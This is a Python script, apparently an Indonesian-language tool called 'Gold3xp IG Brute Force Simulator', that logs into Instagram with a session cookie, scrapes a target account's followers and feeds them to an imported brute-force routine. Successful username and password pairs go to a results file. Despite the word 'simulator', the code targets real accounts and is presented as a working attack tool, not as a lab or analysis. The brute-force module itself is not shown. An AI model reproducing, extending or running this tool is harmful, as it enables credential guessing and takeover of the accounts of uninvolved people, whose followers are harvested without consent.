import os
import json
import time
from instagrapi import Client
from colorama import Fore, init
from utils.brute_force import brute_force_attack

init(autoreset=True)

DATA_FOLDER = "Data/akun1"
COOKIE_FILE = os.path.join(DATA_FOLDER, "cookie.txt")
USER_FILE = os.path.join(DATA_FOLDER, "user.txt")
HASH_DB = "hash_db.json"
RESULT_FILE = "hasil_sukses.txt"

def load_cookie():
    if not os.path.exists(COOKIE_FILE) or not os.path.exists(USER_FILE):
        print(Fore.RED + "[!] cookie.txt atau user.txt tidak ditemukan.")
        exit()

    with open(USER_FILE, "r") as f:
        username = f.read().strip()

    with open(COOKIE_FILE, "r") as f:
        cookie_raw = f.read().strip()

    cookies = {}
    for part in cookie_raw.split(";"):
        if "=" in part:
            k, v = part.strip().split("=", 1)
            cookies[k] = v
    return username, cookies

def save_result(username, password):
    with open(RESULT_FILE, "a") as f:
        f.write(f"{username} | {password}\n")

def load_hash_db():
    if not os.path.exists(HASH_DB):
        return {}
    with open(HASH_DB, "r") as f:
        return json.load(f)

def update_hash_db(db):
    with open(HASH_DB, "w") as f:
        json.dump(db, f, indent=2)

def scrape_followers(cl, target_user):
    try:
        user_id = cl.user_id_from_username(target_user)
        followers = cl.user_followers(user_id)
        return {user.username: user.full_name for user in followers.values()}
    except Exception as e:
        print(Fore.RED + f"[!] Gagal mengambil followers: {e}")
        return {}

def main():
    os.system("clear")
    print(Fore.CYAN + "== Gold3xp IG Brute Force Simulator ==")
    target_user = input(Fore.YELLOW + "Masukkan username target (tanpa @): ").strip().lstrip("@")

    login_user, cookies = load_cookie()

    cl = Client()
    try:
        cl.login_by_sessionid(cookies.get("sessionid"))
        print(Fore.GREEN + f"[✓] Login berhasil sebagai @{login_user}")
    except Exception as e:
        print(Fore.RED + f"[✗] Gagal login: {e}")
        return

    print(Fore.CYAN + f"⏳ Mengambil followers dari @{target_user}...")
    followers = scrape_followers(cl, target_user)
    print(Fore.GREEN + f"[✓] Ditemukan {len(followers)} followers")

    hash_db = load_hash_db()

    # Jalankan brute force terhadap followers
    brute_force_attack(
        user_list=followers,
        hash_db=hash_db,
        save_callback=save_result,
        update_callback=update_hash_db
    )

if __name__ == "__main__":
    main()
